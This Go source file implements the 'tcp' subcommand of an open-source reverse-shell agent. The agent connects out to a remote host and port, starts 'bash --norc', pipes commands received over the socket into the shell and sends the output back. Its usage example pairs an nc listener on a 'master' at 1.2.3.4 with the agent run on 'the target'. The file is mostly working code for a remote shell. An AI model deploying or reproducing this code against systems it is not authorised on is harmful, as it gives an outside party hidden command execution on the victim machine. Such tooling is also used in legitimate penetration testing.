package cmd

import (
	"bufio"
	"fmt"
	"net"
	"time"

	"github.com/golang/glog"
	"github.com/maxlaverse/reverse-shell/agent/handler"
	"github.com/spf13/cobra"
)

const (
	tcpListenerExample = `# On the master (1.2.3.4)
$ nc -v -l -p 7777

# On the target
$ reverse-shell-agent tcp --host=1.2.3.4 --port=7777
`
)

type tcpListenerOptions struct {
	host string
	port int32
}

// NewTCPListenerCommand creates a new cobra.Command for `agent tcp`
func NewTCPListenerCommand(agent Cli) *cobra.Command {
	var opts tcpListenerOptions

	cmd := &cobra.Command{
		Use:              "tcp",
		Short:            "Agent that connects to a remove tcp endpoints and listen for commands",
		Example:          tcpListenerExample,
		TraverseChildren: true,
		Run: func(cmd *cobra.Command, args []string) {
			agent.SafeStart(newTCPListener(opts.host, opts.port))
		},
	}
	cmd.Flags().StringVarP(&opts.host, "host", "", "0.0.0.0", "remote host to connect to")
	cmd.Flags().Int32VarP(&opts.port, "port", "", 8080, "remote port to connect to")

	return cmd
}

type tcpListener struct {
	processOutput     chan *handler.ProcessOutput
	processTerminated chan *handler.ProcessTerminated
	input             chan []byte
	readerClosed      chan struct{}
	connectionLost    chan struct{}
	address           string
	handler           *handler.Handler
}

func newTCPListener(host string, port int32) *tcpListener {
	processOutput := make(chan *handler.ProcessOutput)
	processTerminated := make(chan *handler.ProcessTerminated)

	return &tcpListener{
		processOutput:     processOutput,
		processTerminated: processTerminated,
		input:             make(chan []byte),
		readerClosed:      make(chan struct{}),
		connectionLost:    make(chan struct{}),
		address:           fmt.Sprintf("%s:%d", host, port),
		handler:           handler.NewHandler(processOutput, processTerminated),
	}
}

func (l *tcpListener) Start() error {
	return nil
}

func (l *tcpListener) Listen() error {
	glog.V(2).Infof("Connecting")
	conn, err := net.Dial("tcp", l.address)
	if err != nil {
		glog.Errorf("Failed to establish connection: %s", err)
		return err
	}

	go l.pipeFromProcessOutput(conn)
	go l.pipeToProcessInput(conn)

	processID := l.handler.CreateProcess("bash --norc")

	for {
		select {
		case msg := <-l.input:
			l.handler.ExecuteCommand(processID, msg)
		case <-l.readerClosed:
			glog.V(2).Infof("Lost connection. Stopping the pipeFromProcessOutput loop")
			l.connectionLost <- struct{}{}
			glog.V(2).Infof("Main Loop stopped")
			return fmt.Errorf("Lost connection")
		}
	}
}

func (l *tcpListener) pipeToProcessInput(conn net.Conn) {
	err := conn.SetReadDeadline(time.Now().Add(600 * time.Second))
	if err != nil {
		glog.V(2).Infof("SetReadDeadline failed: %v", err)
		l.readerClosed <- struct{}{}
		conn.Close()
		return
	}

	for {
		recvBuf := make([]byte, 1024)
		size, err := bufio.NewReader(conn).Read(recvBuf)
		if err != nil {
			glog.V(2).Infof("Error while reading data from tcp connection: %s", err)
			l.readerClosed <- struct{}{}
			conn.Close()
			break
		}
		l.input <- recvBuf[0:size]
	}
}

func (l *tcpListener) pipeFromProcessOutput(conn net.Conn) {
PipeLoop:
	for {
		select {
		case a := <-l.processOutput:
			conn.Write([]byte(a.Result))

		case <-l.connectionLost:
			glog.V(2).Infof("Received a connectionLost signal! Stopping the loop")
			break PipeLoop

		case <-l.processTerminated:
			glog.V(2).Infof("Received a processTerminated signal! Closing connection")
			conn.Write([]byte("Process terminated\n"))
			conn.Close()
		}
	}
}
